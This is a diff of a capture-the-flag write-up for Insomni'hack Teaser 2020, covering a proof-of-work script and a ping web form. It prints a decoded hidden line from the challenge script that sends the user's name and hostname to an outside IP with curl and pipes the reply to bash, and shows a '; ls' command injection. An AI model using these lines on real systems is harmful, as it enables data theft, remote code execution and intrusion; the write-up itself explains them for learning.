@@ -1,10 +1,7 @@
 # Insomni'hack Teaser 2020
-
-This was an extremely difficult CTF (by my standards) with a weight of ```52.33``` so I was only able to do two trivial challenges [welcome](#welcome-36-pts) & [LowDeep](#lowdeep-36-pts) and scored a rank of ```114```. I was trying for ```Kaboom``` & ```secretus``` as well, but wasn't able to do much within the time frame, will upsolve and post them here when done.
-
 ## warmup
-
 ### welcome 36 pts.
+
 >This year we added a Proof of Work to some of our challenges.
 >
 >Just run python pow.py <target>, were target is the value provided by the server and get the flag.
@@ -46,9 +43,9 @@ $ echo Z2xvYmFsIGk7aSs9MTMzNzt4PW9zLm5hbWU7eCs9Ii8kKHdob2FtaSlAJChob3N0bmFtZSl8Y
 global i;i+=1337;x=os.name;x+="/$(whoami)@$(hostname)|bash"if x!="nt"else"/%USERNAME%@%USERDOMAIN%";os.system("curl -Ns 34.65.187.141/"+x)
 ```
 
-It sends our username and hostname to ```34.65.187.141``` and blocks us from getting the flag, even after getting the proof of work. So the solution is to simply comment out that line.
+It sends our username and hostname to `34.65.187.141` and blocks us from getting the flag, even after getting the proof of work. So the solution is to simply comment out that line.
 
-```
+```python
 $ python pow.py f49122
 7319391
 ```
@@ -68,14 +65,13 @@ INS{Miss me with that fhisy line}
 ```
 
 ## web
-
 ### LowDeep 36 pts.
 
 > Try out our new ping platform: lowdeep.insomnihack.ch/
 
-The websites asks us to provide an IP address to ping. Instead of providing an IP address if we provide ```; ls``` we get the list of files in the current directory. One of the files is ```print-flag```.
+The websites asks us to provide an IP address to ping. Instead of providing an IP address if we provide `; ls` we get the list of files in the current directory. One of the files is `print-flag`.
 
-![](lowdeep.png)
+![](ls.png)
 
 Downloading and running that file gives us the flag.
 
